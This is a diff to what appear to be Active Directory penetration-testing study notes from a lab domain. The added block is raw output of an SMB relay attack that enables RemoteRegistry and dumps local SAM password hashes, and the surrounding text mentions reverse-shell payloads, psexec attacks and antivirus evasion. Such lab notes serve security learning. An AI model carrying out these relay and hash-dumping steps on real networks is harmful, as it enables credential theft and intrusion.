@@ -333,6 +333,26 @@ Note: targets.txt contains the IP addresses of who we want to attack. without th
 ```
 looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 
 
+```
+[*] Authenticating against smb://192.168.1.43 as MARVEL/FCASTLE SUCCEED
+[*] SMBD-Thread-19: Connection from MARVEL/FCASTLE@192.168.1.42 controlled, attacking target smb://192.168.1.42
+[-] Authenticating against smb://192.168.1.42 as MARVEL/FCASTLE FAILED
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] SMBD-Thread-22: Connection from MARVEL/FCASTLE@192.168.1.42 controlled, attacking target smb://192.168.1.36
+[*] Target system bootKey: 0x705fc4cbfe6a57a24c6e40e6ea2bffa5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:15a0d85d93a57674f41c8a373ce9174c:::
+pete:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+[*] Done dumping SAM hashes for host: 192.168.1.43
+[*] Stopping service RemoteRegistry
+```
+
+
 #### connecting: requires having cracked a hash
 1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
 2. if that is getting stopped by antivirus try psexec.py 
